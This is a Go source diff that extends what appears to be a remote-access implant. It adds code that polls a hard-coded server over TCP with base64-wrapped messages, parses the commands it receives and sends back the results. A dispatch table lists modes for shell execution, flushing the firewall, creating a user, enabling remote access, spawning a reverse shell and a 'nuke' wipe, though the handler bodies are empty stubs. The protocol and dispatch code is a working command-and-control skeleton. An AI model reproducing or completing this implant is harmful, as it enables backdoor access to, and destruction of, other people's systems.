@@ -51,8 +51,8 @@ var OBFSEED = 5
 //OBFTEXT is the seed text that will get used for uuid obfuscation
 var OBFTEXT = "test"
 
-func sendData(data string) string {
-	payload := encodePayload(data)
+func sendData(data string, mode string, aid string) string {
+	payload := encodePayload(data, mode, aid)
 	fmt.Printf("sending: %s\n", payload)
 	conn, err := net.Dial("tcp4", serv)
 	if err != nil {
@@ -70,8 +70,9 @@ func sendData(data string) string {
 }
 
 // base64 the payload and prepend/append magic chars
-func encodePayload(data string) string {
-	encStr := base64.StdEncoding.EncodeToString([]byte(data))
+func encodePayload(data string, mode string, aid string) string {
+	preEnc := mode + "||" + aid + "||" + data
+	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
 	fin := MAGICSTR + encStr + MAGICTERMSTR
 	return fin
 }
@@ -90,8 +91,84 @@ func register() string {
 	intrv := strconv.Itoa(INTERVAL)
 	dlt := strconv.Itoa(DELTA)
 	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
-	ret := sendData(payload)
+	ret := sendData(payload, "C", "0")
 	return ret
+}
+
+func getCommand() {
+	uid := fetchUUID()
+	coms := sendData(uid, "D", "0")
+	results := parseCommands(coms)
+	if results == nil {
+		return
+	}
+	sendResults(results)
+	return
+}
+
+func parseCommands(commandBlob string) []string {
+	results := []string{}
+	isplit := strings.Split(commandBlob, "<||>")
+	for _, comStr := range isplit {
+		jsplit := strings.SplitN(comStr, ":", 3)
+		aid := jsplit[0]
+		mode := jsplit[1]
+		if mode == "0" {
+			return nil
+		}
+		args := jsplit[2]
+		output := execCommand(mode, args)
+		resStr := aid + ":" + output
+		results = append(results, resStr)
+	}
+	return results
+}
+
+func execCommand(mode string, args string) string {
+	retval := ""
+	switch mode {
+	case "0": //no command
+		return ""
+	case "1": //shell exec of args
+		retval = shellExec(args)
+	case "2":
+		retval = fwFlush()
+	case "3":
+		retval = createUser()
+	case "4":
+		retval = enableRemote()
+	case "5":
+		retval = spawnRevShell(args)
+	case "6":
+		retval = unknownCom()
+	case "7":
+		retval = unknownCom()
+	case "8":
+		retval = unknownCom()
+	case "9":
+		retval = unknownCom()
+	case "A":
+		retval = unknownCom()
+	case "B":
+		retval = unknownCom()
+	case "C":
+		retval = unknownCom()
+	case "D":
+		retval = unknownCom()
+	case "E":
+		retval = unknownCom()
+	case "F":
+		retval = nuke()
+	default:
+		retval = unknownCom()
+	}
+	return retval
+}
+
+func sendResults(results []string) {
+	resStr := strings.Join(results, "<||>")
+	sendData(resStr, "E", "0")
+	return
 }
 
 func getIP() string {
@@ -136,6 +213,35 @@ func deobfuscateUUID(obf string) string {
 	p = p[:18] + "-" + p[18:]
 	p = p[:23] + "-" + p[23:]
 	return p
+}
+
+func shellExec(args string) string {
+	return ""
+}
+
+func fwFlush() string {
+	return ""
+}
+
+func createUser() string {
+	return ""
+}
+
+func enableRemote() string {
+	return ""
+}
+
+func spawnRevShell(target string) string {
+	return ""
+}
+
+func nuke() string {
+	//rm rf dat boi
+	return ""
+}
+
+func unknownCom() string {
+	return ""
 }
 
 func main() {
